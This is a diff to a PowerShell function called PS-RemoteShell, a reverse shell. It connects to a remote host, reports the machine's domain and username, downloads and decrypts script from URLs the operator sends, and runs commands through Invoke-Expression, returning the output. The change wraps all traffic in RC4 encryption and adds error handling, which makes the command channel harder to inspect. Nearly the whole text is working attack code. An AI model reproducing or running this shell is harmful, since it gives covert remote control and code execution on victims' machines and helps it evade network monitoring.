@@ -51,6 +51,7 @@ function PS-RemoteShell {
 		$s = New-Object System.Net.Sockets.TCPClient($ip, $port);
 		$stream = $s.GetStream();
 		[byte[]]$bytes = 0..255|%{0}
+		[byte[]]$sendData
 		
 		if( -not (Test-Path env:userdomain)) {
 			$domain = $env:computername
@@ -62,31 +63,40 @@ function PS-RemoteShell {
 		$target = $target.ipaddress[0] 
 		
 		$promptUrl = ([text.encoding]::ASCII).GetBytes("(" + $target + ":" + $domain + "\" + $env:username + "):Url >")
-		$stream.Write($promptUrl, 0, $promptUrl.Length)
+		$sendData = ($promptUrl | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+		$stream.Write($sendData, 0, $sendData.Length)
+		
 		while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 			
-			$received = New-Object -TypeName System.Text.ASCIIEncoding
-			$url = $received.GetString($bytes,0, $i)
-			$url = $url.Substring(0, $url.Length - 1)
+			$url = ($bytes | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			$url = ([System.Text.Encoding]::ASCII).GetString($url, 0, $i)
 			
 			if($url.ToUpper() -ne "NULL") {
-				$data = (New-Object Net.WebClient).DownloadData($url)
-				$data = ($data | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
-				$data = [System.Text.Encoding]::ASCII.GetString($data)
+				Try {
+					$data = (New-Object Net.WebClient).DownloadData($url)
+					$data = ($data | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+					$data = [System.Text.Encoding]::ASCII.GetString($data)
+				} Catch {
+					$data = ""
+				}
 			} 
 			
 			$promptCmd = ([text.encoding]::ASCII).GetBytes("(" + $url + "):Exec >")
-			$stream.Write($promptCmd, 0, $promptCmd.Length)
+			$sendData = ($promptCmd | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			$stream.Write($sendData, 0, $sendData.Length)
+			
 			$j = $stream.Read($bytes, 0, $bytes.Length)
-			$received = New-Object -TypeName System.Text.ASCIIEncoding
-			$cmd = $received.GetString($bytes,0, $j)
+			$cmd = ($bytes | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			$cmd = ([System.Text.Encoding]::ASCII).GetString($cmd, 0, $j)
 			
 			$cmd = $data + ";" + $cmd
 			$exec = (Invoke-Expression -Command $cmd 2>&1 | Out-String )
-			$data = "GARBAGE"
+			$data = ""
 			$exec  = $exec + "`n"
-			$sendbyte = ([text.encoding]::ASCII).GetBytes($exec) + $promptUrl
-			$stream.Write($sendbyte,0,$sendbyte.Length)
+			
+			$sendBytes = ([text.encoding]::ASCII).GetBytes($exec) + $promptUrl
+			$sendData = ($sendBytes | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			$stream.Write($sendData, 0, $sendData.Length)
 			$stream.Flush()  
 		}
 		$s.Close()
